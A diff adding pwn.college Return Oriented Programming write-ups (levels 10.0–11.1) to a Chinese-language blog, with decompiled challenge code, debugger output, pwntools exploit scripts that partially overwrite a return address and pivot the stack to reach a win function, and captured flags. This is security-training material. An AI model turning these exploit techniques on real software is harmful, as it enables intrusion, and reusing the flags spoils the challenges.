@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-21 18:04"
+modDate: "2025-01-21 23:59"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -3137,3 +3137,670 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{8cUj1kJEP7UIyfDvbSd34M8nJI-.0FO1MDL5cTNxgzW}`
+
+## Level 10.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform a partial overwrite to call the win function.
+
+### Write-up
+
+```c ins={41-44} del={46} collapse={1-37, 50-52}
+int __fastcall challenge(int a1, __int64 a2, __int64 a3)
+{
+  _QWORD v4[3]; // [rsp+0h] [rbp-A0h] BYREF
+  int v5; // [rsp+1Ch] [rbp-84h]
+  void *dest[15]; // [rsp+20h] [rbp-80h] BYREF
+  int v7; // [rsp+9Ch] [rbp-4h]
+  __int64 savedregs; // [rsp+A0h] [rbp+0h] BYREF
+  _UNKNOWN *retaddr; // [rsp+A8h] [rbp+8h] BYREF
+
+  v5 = a1;
+  v4[2] = a2;
+  v4[1] = a3;
+  puts(
+    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
+  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
+  memset(dest, 0, 0x70uLL);
+  sp_ = (__int64)v4;
+  bp_ = (__int64)&savedregs;
+  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
+  rp_ = (__int64)&retaddr;
+  puts(
+    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
+  puts(
+    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
+  puts(
+    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
+  puts(
+    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
+  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
+  puts("In this challenge, a pointer to the win function is stored on the stack.");
+  printf("That pointer is stored at %p, %d bytes before your input buffer.\n", dest, 8);
+  puts("If you can pivot the stack to make the next gadget run be that win function, you will get the flag!\n");
+  puts("ASLR means that the address of the stack is not known,");
+  puts("but I will simulate a memory disclosure of it.");
+  puts("By knowing where the stack is, you can now reference data");
+  puts("that you write onto the stack.");
+  puts("Be careful: this data could trip up your ROP chain,");
+  puts("because it could be interpreted as return addresses.");
+  puts("You can use gadgets that shift the stack appropriately to avoid that.");
+  printf("[LEAK] Your input buffer is located at: %p.\n\n", &dest[1]);
+  dest[0] = mmap(0LL, 0x138uLL, 3, 34, 0, 0LL);
+  memcpy(dest[0], sub_2760, 0x138uLL);
+  if ( mprotect(dest[0], 0x138uLL, 5) )
+    __assert_fail("mprotect(data.win_addr, 0x138, PROT_READ|PROT_EXEC) == 0", "<stdin>", 0xA0u, "challenge");
+  printf("The win function has just been dynamically constructed at %p.\n", dest[0]);
+  v7 = read(0, &dest[1], 0x1000uLL);
+  printf("Received %d bytes! This is potentially %d gadgets.\n", v7, ((unsigned __int64)&dest[1] + v7 - rp_) >> 3);
+  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
+  puts("from within this challenge. You will have to do that by yourself.");
+  print_chain(rp_, (unsigned int)(((unsigned __int64)&dest[1] + v7 - rp_) >> 3) + 1);
+  return puts("Leaving!");
+}
+```
+
+```c
+signed __int64 sub_2760()
+{
+  signed __int64 v0; // rax
+  char v2[264]; // [rsp+0h] [rbp-108h] BYREF
+
+  *(_QWORD *)v2 = 0x67616C662FLL;
+  v0 = sys_open(v2, 0, 0);
+  return sys_write(1u, v2, sys_read(v0, v2, 0x100uLL));
+}
+```
+
+标绿的部分把 `sub_2760` 的地址映射到了 `dest[0]`，并设置为 `r-x`，`read` 可以覆盖返回地址，但这个程序开启了 PIE，我们需要通过部分写绕过它，执行 `dest[0]` 处保存的 `sub_2760`。
+
+比如我们知道一个 gadget 是 `0x0000000000001313 : pop rbp ; ret`，因为有 PIE 所以我们只能得到它的偏移 `0x313`，调试验证一下在已知页地址的情况下利用这个偏移得到的是否是 `pop rbp ; ret` 这个 gadget：
+
+```asm wrap=false showLineNumbers=false collapse={2-20, 28-50}
+Breakpoint 1, 0x000058bfb2ecdaf6 in challenge ()
+------- tip of the day (disable with set show-tips off) -------
+Pwndbg sets the SIGLARM, SIGBUS, SIGPIPE and SIGSEGV signals so they are not passed to the app; see info signals for full GDB signals configuration
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+───────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────
+ RAX  9
+ RBX  0x7ffe804c46d8 —▸ 0x7ffe804c6633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level10.0'
+ RCX  0x77b50a11b7a4 (write+20) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0
+ RDI  0x77b50a1f8710 ◂— 0
+ RSI  0x77b50a1f7643 (_IO_2_1_stdout_+131) ◂— 0x1f8710000000000a /* '\n' */
+ R8   0x58bfc6494010 ◂— 0
+ R9   7
+ R10  0x58bfc64942a0 ◂— 0x58bfc6494
+ R11  0x202
+ R12  1
+ R13  0
+ R14  0x77b50aae8000 (_rtld_global) —▸ 0x77b50aae92e0 —▸ 0x58bfb2ecc000 ◂— 0x10102464c457f
+ R15  0
+ RBP  0x4141414141414141 ('AAAAAAAA')
+ RSP  0x7ffe804c4588 —▸ 0x58bfb2ecdb9c (main+165) ◂— lea rdi, [rip + 0xd98]
+ RIP  0x58bfb2ecdaf6 (challenge+703) ◂— ret
+────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────
+ ► 0x58bfb2ecdaf6 <challenge+703>         ret                                <main+165>
+    ↓
+   0x58bfb2ecdb9c <main+165>              lea    rdi, [rip + 0xd98]     RDI => 0x58bfb2ece93b ◂— '### Goodbye!'
+   0x58bfb2ecdba3 <main+172>              call   puts@plt                    <puts@plt>
+
+   0x58bfb2ecdba8 <main+177>              mov    eax, 0                  EAX => 0
+   0x58bfb2ecdbad <main+182>              leave
+   0x58bfb2ecdbae <main+183>              ret
+
+   0x58bfb2ecdbaf                         nop
+   0x58bfb2ecdbb0 <__libc_csu_init>       endbr64
+   0x58bfb2ecdbb4 <__libc_csu_init+4>     push   r15
+   0x58bfb2ecdbb6 <__libc_csu_init+6>     lea    r15, [rip + 0x2173]     R15 => 0x58bfb2ecfd30 (__init_array_start) —▸ 0x58bfb2ecd320 (frame_dummy) ◂— endbr64
+   0x58bfb2ecdbbd <__libc_csu_init+13>    push   r14
+─────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp 0x7ffe804c4588 —▸ 0x58bfb2ecdb9c (main+165) ◂— lea rdi, [rip + 0xd98]
+01:0008│     0x7ffe804c4590 ◂— 0
+02:0010│     0x7ffe804c4598 —▸ 0x7ffe804c46e8 —▸ 0x7ffe804c6669 ◂— 'MOTD_SHOWN=pam'
+03:0018│     0x7ffe804c45a0 —▸ 0x7ffe804c46d8 —▸ 0x7ffe804c6633 ◂— '/home/cub3y0nd/Projects/pwn.college/babyrop_level10.0'
+04:0020│     0x7ffe804c45a8 ◂— 0x1804c46d8
+05:0028│     0x7ffe804c45b0 —▸ 0x7ffe804c4650 —▸ 0x7ffe804c46b0 ◂— 0
+06:0030│     0x7ffe804c45b8 —▸ 0x77b50a034e08 ◂— mov edi, eax
+07:0038│     0x7ffe804c45c0 —▸ 0x7ffe804c4600 —▸ 0x77b50aae8000 (_rtld_global) —▸ 0x77b50aae92e0 —▸ 0x58bfb2ecc000 ◂— ...
+───────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x58bfb2ecdaf6 challenge+703
+   1   0x58bfb2ecdb9c main+165
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+pwndbg> x/2i 0x58bfb2ecd313
+   0x58bfb2ecd313 <__do_global_dtors_aux+51>: pop    rbp
+   0x58bfb2ecd314 <__do_global_dtors_aux+52>: ret
+```
+
+嗯，看来猜想没问题，那么盲猜页地址加覆盖低三 nibbles 就可以调用我们的 gadgets 了。
+
+知道了怎么调用 gadgets，还需要思考整体攻击思路。我们有一个已泄漏的栈地址，把这个地址减八就是保存 `sub_2760` 函数的地址的地址了，我们可以通过栈迁移把 `rsp` 设置为泄漏的地址减十六，这样 `ret` 就执行 `sub_2760` 了。
+
+我本想这样做，勿喷……：
+
+```python
+payload = padding_to_ret
+payload += flat(
+    pop_rbp_ret_fixed_offset + random.choice(pop_rbp_ret_possible_bytes),
+    pop_rbp_ret,
+    leaked_addr,
+    leave_ret_fixed_offset + random.choice(leave_ret_possible_bytes),
+)
+```
+
+后来发现低 3 nibbles 覆盖了后 `pop_rbp_ret` 什么的会接着覆盖别的，所以这么做行不通。后来我意识到 `rbp` 在 `rip` 之前，提前设置好它不就完了？
+
+需要注意的是 `leave ; ret` 到底要 `pop` 什么以及 `ret` 到哪里：
+
+```asm wrap=false showLineNumbers=false
+pwndbg> x/10gx 0x7ffd39e82968-0x10
+0x7ffd39e82958: 0x00000001bee9a191 0x00007873bf78b000
+0x7ffd39e82968: 0x4141414141414141 0x4141414141414141
+0x7ffd39e82978: 0x4141414141414141 0x4141414141414141
+0x7ffd39e82988: 0x4141414141414141 0x4141414141414141
+0x7ffd39e82998: 0x4141414141414141 0x4141414141414141
+```
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level10.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *challenge+703
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+
+    padding_to_rbp = b"".ljust(0x78, b"A")
+
+    leave_ret = rop.leave.address
+
+    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
+    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
+    leave_ret_possible_high_bytes = [
+        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
+    ]
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{g4EQhfj4W4pI_g9tDdWlqPAdtK2.0VO1MDL5cTNxgzW}`
+
+## Level 10.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform a partial overwrite to call the win function.
+
+### Write-up
+
+参见 [Level 10.0](#level-10)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level10.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+
+    padding_to_rbp = b"".ljust(0x78, b"A")
+
+    leave_ret = rop.leave.address
+
+    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
+    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
+    leave_ret_possible_high_bytes = [
+        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
+    ]
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{kq62r2gqRuS8CCZ5IsBJ4-OK_E-.0FM2MDL5cTNxgzW}`
+
+## Level 11.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform a partial overwrite to call the win function.
+
+### Write-up
+
+一眼题目结构和上题类似？好像没有区别吧……
+
+看看，好的思路和 exp 是可以拿来反复秒题的 LMAO
+
+唯有一点我不太懂，你这是何必呢？
+
+<a href="https://cdn.jsdelivr.net/gh/CuB3y0nd/IMAGES@master/assets/Shot-2025-01-21-220224.png" data-fancybox data-caption>
+  <img src="https://cdn.jsdelivr.net/gh/CuB3y0nd/IMAGES@master/assets/Shot-2025-01-21-220224.png" />
+</a>
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level11.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+
+    padding_to_rbp = b"".ljust(0x88, b"A")
+
+    leave_ret = rop.leave.address
+
+    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
+    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
+    leave_ret_possible_high_bytes = [
+        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
+    ]
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{ogFd_c22L6ok_8m23oykWyxLfn9.0VM2MDL5cTNxgzW}`
+
+## Level 11.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Perform a partial overwrite to call the win function.
+
+### Write-up
+
+参见 [Level 10](#level-10)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    p8,
+    process,
+    random,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level11.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload(leaked_addr):
+    rop = ROP(elf)
+
+    padding_to_rbp = b"".ljust(0x38, b"A")
+
+    leave_ret = rop.leave.address
+
+    leave_ret_fixed_low_byte = p8(leave_ret & 0xFF)
+    leave_ret_fixed_high_nibble = (leave_ret >> 0x8) & ~(1 << 4)
+    leave_ret_possible_high_bytes = [
+        p8(leave_ret_fixed_high_nibble + i) for i in range(0x00, 0x100, 0x10)
+    ]
+
+    payload = padding_to_rbp
+    payload += flat(
+        leaked_addr - 0x10,
+        leave_ret_fixed_low_byte + random.choice(leave_ret_possible_high_bytes),
+    )
+
+    return payload
+
+
+def leak(target):
+    target.recvuntil(b"located at: ")
+
+    return int(target.recv(0xE), 16)
+
+
+def attack(target, payload):
+    try:
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    while True:
+        try:
+            target = launch(debug=False)
+            payload = construct_payload(leak(target))
+
+            if attack(target, payload):
+                exit()
+        except Exception as e:
+            log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{oSzRHWf3oNfOmzKglfN7pBOGmyY.0lM2MDL5cTNxgzW}`
